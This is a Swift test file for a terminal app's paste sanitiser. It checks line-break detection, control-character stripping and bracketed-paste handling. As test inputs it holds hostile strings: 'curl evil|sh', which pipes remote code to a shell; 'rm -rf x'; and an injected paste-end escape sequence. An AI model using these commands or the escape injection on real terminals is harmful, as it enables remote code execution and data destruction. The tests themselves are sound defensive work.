import Testing
@testable import PortlightKit

@Suite struct PastedTextTests {
    @Test func windowsLineEndingsCountAsLineBreaks() {
        // Swift treats "\r\n" as one Character, so String.contains("\n")
        // misses it; the check must look at scalars.
        #expect(PastedText.hasLineBreak("ls\r\nrm -rf x\r\n"))
        #expect(PastedText.hasLineBreak("a\nb"))
        #expect(PastedText.hasLineBreak("a\rb"))
        #expect(!PastedText.hasLineBreak("git status"))
        #expect(!PastedText.hasLineBreak("tab\tseparated"))
    }

    @Test func escapeCannotEndABracketedPasteEarly() {
        let hostile = "x\u{1B}[201~\ncurl evil|sh\n"
        let cleaned = PastedText.cleaned(hostile)
        #expect(!cleaned.unicodeScalars.contains("\u{1B}"))
        #expect(cleaned == "x[201~\ncurl evil|sh\n")
        let bytes = PastedText.bytes(for: hostile, bracketed: true)
        let start: [UInt8] = [0x1B, 0x5B, 0x32, 0x30, 0x30, 0x7E]
        let end: [UInt8] = [0x1B, 0x5B, 0x32, 0x30, 0x31, 0x7E]
        #expect(Array(bytes.prefix(6)) == start)
        #expect(Array(bytes.suffix(6)) == end)
        // The only ESC bytes are the two markers Portlight adds.
        #expect(bytes.filter { $0 == 0x1B }.count == 2)
    }

    @Test func controlCharactersAreDroppedButLayoutKept() {
        #expect(PastedText.cleaned("a\u{03}b\u{7F}c\u{9B}d\u{07}e") == "abcde")
        #expect(PastedText.cleaned("a\tb\r\nc\n") == "a\tb\r\nc\n")
        #expect(PastedText.cleaned("café → ok") == "café → ok")
    }

    @Test func unbracketedBytesAreTheCleanedText() {
        #expect(PastedText.bytes(for: "ls\u{1B}[A", bracketed: false) == Array("ls[A".utf8))
        #expect(PastedText.bytes(for: "", bracketed: true).isEmpty)
    }
}
